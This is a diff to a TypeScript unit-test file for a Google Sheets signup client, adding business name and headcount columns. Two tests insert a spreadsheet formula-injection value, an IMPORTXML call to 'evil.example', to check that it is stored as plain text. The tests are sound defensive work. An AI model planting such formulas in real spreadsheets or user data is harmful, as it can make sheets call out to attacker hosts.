@@ -35,6 +35,8 @@ const input = (email: string) => ({
   countryName: "United Kingdom",
 })
 
+const business = { businessName: "Acme", businessHeadcount: "11–50" }
+
 function harness(
   initial: Parameters<typeof fakeWorksheet>[0] = { headers: [...COLUMNS] },
   options: { timeZone?: string; now?: string } = {},
@@ -135,6 +137,8 @@ describe("unit: sheets client", () => {
         last_seen_at: at,
         ...country,
         contacted: "",
+        business_name: "",
+        business_headcount: "",
       },
     ])
     await h.client.upsert(input("a@b.com"))
@@ -230,6 +234,8 @@ describe("unit: sheets client", () => {
         "first_seen_at",
         "country_name",
         "country_code",
+        "business_name",
+        "business_headcount",
       ],
       rows: [{ note: "keep", last_seen_at: "old", email: "a@b.com" }],
     })
@@ -243,6 +249,8 @@ describe("unit: sheets client", () => {
         email: "c@d.com",
         first_seen_at: at,
         ...country,
+        business_name: "",
+        business_headcount: "",
       },
     ])
     expect(h.calls.loadCells).toEqual([["B2", "F2", "E2"]])
@@ -270,7 +278,7 @@ describe("unit: sheets client", () => {
   test("reports all missing columns and the expected header", async () => {
     const h = harness({ headers: ["note"] })
     await expect(h.client.upsert(input("a@b.com"))).rejects.toThrow(
-      "Missing worksheet columns: email, first_seen_at, last_seen_at, country_code, country_name. Expected: email, first_seen_at, last_seen_at, country_code, country_name, contacted",
+      "Missing worksheet columns: email, first_seen_at, last_seen_at, country_code, country_name, business_name, business_headcount. Expected: email, first_seen_at, last_seen_at, country_code, country_name, contacted, business_name, business_headcount",
     )
     noWrites(h.calls)
   })
@@ -280,10 +288,21 @@ describe("unit: sheets client", () => {
     expect(await h.client.upsert(input("a@b.com"))).toEqual({
       outcome: "inserted",
       headerCreated: false,
-      columnsAdded: ["country_code", "country_name"],
+      columnsAdded: [
+        "country_code",
+        "country_name",
+        "business_name",
+        "business_headcount",
+      ],
     })
     expect(h.calls.setHeaderRow).toEqual([
-      [...headers, "country_code", "country_name"],
+      [
+        ...headers,
+        "country_code",
+        "country_name",
+        "business_name",
+        "business_headcount",
+      ],
     ])
     expect(h.rows[0]).toEqual({
       email: "a@b.com",
@@ -291,6 +310,8 @@ describe("unit: sheets client", () => {
       last_seen_at: at,
       contacted: "",
       ...country,
+      business_name: "",
+      business_headcount: "",
     })
     await h.client.upsert(input("c@d.com"))
     expect(h.calls.setDataValidation).toEqual(
@@ -315,10 +336,55 @@ describe("unit: sheets client", () => {
         "last_seen_at",
         "country_code",
         "country_name",
+        "business_name",
+        "business_headcount",
       ],
     })
-    expect(h.headers()).toEqual(COLUMNS.slice(0, 5))
+    expect(h.headers()).toEqual(
+      COLUMNS.filter((column) => column !== "contacted"),
+    )
     expect(h.calls.setDataValidation).toEqual([])
+  })
+  test("appends the business columns after contacted, moving nothing", async () => {
+    const headers = COLUMNS.filter((column) => !column.startsWith("business_"))
+    const h = harness({
+      headers,
+      rows: [{ email: "a@b.com", contacted: "TRUE" }],
+    })
+    await h.client.upsert({ ...input("a@b.com"), ...business })
+    expect(h.headers()).toEqual([...COLUMNS])
+    expect(h.rows[0].contacted).toBe("TRUE")
+    expect(h.rows[0].business_name).toBe("Acme")
+  })
+  test("sends a new row's business details raw, so a formula stays text", async () => {
+    const h = harness()
+    const businessName = '=IMPORTXML("https://evil.example","//a")'
+    await h.client.upsert({ ...input("a@b.com"), ...business, businessName })
+    expect(h.calls.addRow[0].options).toEqual({ raw: true })
+    expect(h.rows[0].business_name).toBe(businessName)
+  })
+  test("writes a repeat signup's business details through stringValue, so a formula stays text", async () => {
+    const h = harness()
+    const businessName = '=IMPORTXML("https://evil.example","//a")'
+    await h.client.upsert(input("a@b.com"))
+    await h.client.upsert({ ...input("a@b.com"), ...business, businessName })
+    expect(h.calls.saveUpdatedCells[0]).toContainEqual({
+      address: "G2",
+      value: businessName,
+    })
+    expect(h.rows[0].business_name).toBe(businessName)
+  })
+  test("a signup without business details leaves those cells alone", async () => {
+    const h = harness()
+    await h.client.upsert({ ...input("a@b.com"), ...business })
+    await h.client.upsert(input("a@b.com"))
+    expect(h.calls.saveUpdatedCells[0].map(({ address }) => address)).toEqual([
+      "C2",
+      "D2",
+      "E2",
+    ])
+    expect(h.rows[0].business_name).toBe("Acme")
+    expect(h.rows[0].business_headcount).toBe("11–50")
   })
   test("does not validate cells when appending fails", async () => {
     const h = harness({ fail: { addRow: new Error("append failed") } })
